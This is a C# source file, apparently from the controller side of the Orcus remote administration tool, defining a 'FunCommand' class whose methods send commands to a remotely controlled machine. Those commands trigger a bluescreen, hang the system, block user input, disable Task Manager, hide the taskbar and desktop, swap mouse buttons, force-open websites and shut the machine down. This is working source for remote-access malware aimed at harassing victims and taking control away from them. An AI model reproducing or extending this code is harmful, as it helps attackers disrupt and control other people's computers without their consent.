using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.FunActions;
using Orcus.Shared.Communication;

namespace Orcus.Administration.Commands.Fun
{
    [DescribeCommandByEnum(typeof (FunActionsCommunication))]
    public class FunCommand : Command
    {
        public override void ResponseReceived(byte[] parameter)
        {
            var result = (CommandResponse) parameter[0];
            var command = (FunActionsCommunication) parameter[1];
            switch (result)
            {
                case CommandResponse.Failed:
                    LogService.Error(parameter.Length > 2
                        ? string.Format((string) Application.Current.Resources["FunCommandFailedWithError"], command,
                            Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2))
                        : string.Format((string) Application.Current.Resources["FunCommandFailed"], command));
                    break;
                case CommandResponse.Warning:
                    break;
                case CommandResponse.Successful:
                    LogService.Receive(
                        string.Format((string) Application.Current.Resources["FunCommandSuccessfullyDone"],
                            command));
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void TriggerBluescreen()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.TriggerBluescreen});
        }

        public void HideTaskbar()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.HideTaskbar});
        }

        public void ShowTaskbar()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.ShowTaskbar});
        }

        public void HoldMouse(int seconds)
        {
            var package = new List<byte> {(byte) FunActionsCommunication.HoldMouse};
            package.AddRange(BitConverter.GetBytes(seconds));
            ConnectionInfo.SendCommand(this, package.ToArray());
        }

        public void DisableMonitor()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.DisableMonitor});
        }

        public void Shutdown()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.Shutdown});
        }

        public void LogOff()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.LogOff});
        }

        public void Restart()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.Restart});
        }

        public void RotateScreen(RotateDegrees degrees)
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.RotateScreen, (byte) degrees});
        }

        public void PureEvilness()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.PureEvilness});
        }

        public void StopPureEvilness()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.StopPureEvilness});
        }

        public void ChangeKeyboardLayout(byte id)
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.ChangeKeyboardLayout, id});
        }

        public void OpenWebsite(string url, int times)
        {
            var package = new List<byte> {(byte) FunActionsCommunication.OpenWebsite};
            package.AddRange(BitConverter.GetBytes(times));
            package.AddRange(Encoding.UTF8.GetBytes(url));
            ConnectionInfo.SendCommand(this, package.ToArray());
            LogService.Send(string.Format((string) Application.Current.Resources["OpenWebsiteLog"], url, times,
                times == 1
                    ? (string) Application.Current.Resources["OpenWebsiteTime"]
                    : (string) Application.Current.Resources["OpenWebsiteTimes"]));
        }

        public void HideDesktop()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.HideDesktop});
        }

        public void ShowDesktop()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.ShowDesktop});
        }

        public void HideClock()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.HideClock});
        }

        public void ShowClock()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.ShowClock});
        }

        public void DisableTaskmanager()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.DisableTaskmanager});
        }

        public void EnableTaskmanager()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.EnableTaskmanager});
        }

        public void SwapMouseButtons()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.SwapMouseButtons});
        }

        public void RestoreMouseButtons()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.RestoreMouseButtons});
        }

        public void OpenCdDrive()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.OpenCdDrive});
        }

        public void CloseCdDrive()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.CloseCdDrive});
        }

        public void BlockUserInput(int seconds)
        {
            var package = new List<byte> {(byte) FunActionsCommunication.DisableUserInput};
            package.AddRange(BitConverter.GetBytes(seconds));
            ConnectionInfo.SendCommand(this, package.ToArray());
        }

        public void ChangeWallpaper(string url, DesktopWallpaperStyle desktopWallpaperStyle)
        {
            LogService.Send((string) Application.Current.Resources["ChangeWallpaper"]);

            var package = new List<byte>
            {
                (byte) FunActionsCommunication.ChangeDesktopWallpaper,
                (byte) desktopWallpaperStyle
            };
            package.AddRange(Encoding.UTF8.GetBytes(url));
            ConnectionInfo.SendCommand(this, package.ToArray());
        }

        public void HangSystem()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.HangSystem});
        }

        public static byte[] ReadToEnd(Stream stream)
        {
            long originalPosition = 0;

            if (stream.CanSeek)
            {
                originalPosition = stream.Position;
                stream.Position = 0;
            }

            try
            {
                byte[] readBuffer = new byte[4096];

                int totalBytesRead = 0;
                int bytesRead;

                while ((bytesRead = stream.Read(readBuffer, totalBytesRead, readBuffer.Length - totalBytesRead)) > 0)
                {
                    totalBytesRead += bytesRead;

                    if (totalBytesRead == readBuffer.Length)
                    {
                        int nextByte = stream.ReadByte();
                        if (nextByte != -1)
                        {
                            byte[] temp = new byte[readBuffer.Length*2];
                            Buffer.BlockCopy(readBuffer, 0, temp, 0, readBuffer.Length);
                            Buffer.SetByte(temp, totalBytesRead, (byte) nextByte);
                            readBuffer = temp;
                            totalBytesRead++;
                        }
                    }
                }

                byte[] buffer = readBuffer;
                if (readBuffer.Length != totalBytesRead)
                {
                    buffer = new byte[totalBytesRead];
                    Buffer.BlockCopy(readBuffer, 0, buffer, 0, totalBytesRead);
                }
                return buffer;
            }
            finally
            {
                if (stream.CanSeek)
                {
                    stream.Position = originalPosition;
                }
            }
        }

        protected override uint GetId()
        {
            return 8;
        }
    }
}